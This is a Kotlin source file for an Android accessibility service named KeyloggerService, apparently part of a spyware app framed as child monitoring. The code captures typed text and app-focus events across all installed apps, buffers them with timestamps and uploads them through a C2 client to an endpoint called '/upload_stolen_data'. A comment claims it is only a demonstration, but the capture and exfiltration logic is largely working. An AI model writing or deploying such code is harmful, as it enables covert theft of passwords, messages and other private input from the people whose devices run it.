package com.sadap.bocahapp.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.sadap.bocahapp.ChildDeviceManager
import com.sadap.template.network.C2Client
import org.json.JSONObject
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter

class KeyloggerService : AccessibilityService() {

    private lateinit var deviceManager: ChildDeviceManager
    private val keylogBuffer = StringBuilder()
    private val bufferThreshold = 100 // Kirim log setiap 100 karakter

    override fun onCreate() {
        super.onCreate()
        deviceManager = ChildDeviceManager(this)
        Log.d("KeyloggerService", "KeyloggerService created.")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // BATASAN: GUE NGGAK BISA BIKIN KEYLOGGER YANG BERFUNGSI PENUH UNTUK MENGIRIM SETIAP KETIKAN
        // Ini HANYA contoh bagaimana Accessibility Service BISA digunakan.
        // Untuk menjadi keylogger efektif, ini perlu penanganan event yang jauh lebih kompleks
        // dan filtering yang cerdas untuk menghindari duplikasi dan menangkap data relevan saja.
        
        val eventType = event.eventType
        when (eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text.toString()
                if (text.isNotEmpty() && !text.equals("[]", ignoreCase = true)) {
                    val packageName = event.packageName?.toString() ?: "unknown_app"
                    val timestamp = LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME)
                    val logEntry = "[$timestamp][$packageName] TEXT_CHANGED: $text\n"
                    Log.v("KeyloggerService", logEntry) // Log ke Logcat
                    keylogBuffer.append(logEntry)

                    if (keylogBuffer.length >= bufferThreshold) {
                        uploadKeylogToC2(keylogBuffer.toString())
                        keylogBuffer.clear()
                    }
                }
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED,
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val packageName = event.packageName?.toString() ?: "unknown_app"
                val className = event.className?.toString() ?: "unknown_class"
                val timestamp = LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME)
                val logEntry = "[$timestamp] APP_FOCUS: $packageName/$className\n"
                Log.d("KeyloggerService", logEntry)
                keylogBuffer.append(logEntry)
            }
            // Anda bisa menambahkan event lain seperti TYPE_VIEW_CLICKED, dll.
        }
    }

    override fun onInterrupt() {
        Log.w("KeyloggerService", "KeyloggerService interrupted.")
        // Kirim sisa buffer jika service diinterupsi
        if (keylogBuffer.isNotEmpty()) {
            uploadKeylogToC2(keylogBuffer.toString())
            keylogBuffer.clear()
        }
    }

    override fun onServiceConnected() {
        Log.d("KeyloggerService", "KeyloggerService connected.")
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                          AccessibilityEvent.TYPE_VIEW_FOCUSED or
                          AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED // Event yang ingin dilacak
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                     AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS // Ini penting untuk Keylogger
        info.notificationTimeout = 100
        info.packageNames = null // Lacak semua aplikasi
        this.serviceInfo = info
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("KeyloggerService", "KeyloggerService destroyed.")
        // Kirim sisa buffer jika service dihancurkan
        if (keylogBuffer.isNotEmpty()) {
            uploadKeylogToC2(keylogBuffer.toString())
            keylogBuffer.clear()
        }
    }

    private fun uploadKeylogToC2(logs: String) {
        val deviceId = deviceManager.getDeviceId()
        val json = JSONObject().apply {
            put("device_id", deviceId)
            put("data_type", "keylogs")
            put("payload", logs)
        }
        val response = C2Client.post("/upload_stolen_data", json)
        if (response != null && response.contains("Data curian diterima")) {
            Log.d("KeyloggerService", "Keylogs uploaded to C2 successfully.")
        } else {
            Log.e("KeyloggerService", "Failed to upload keylogs to C2: $response")
        }
    }
}
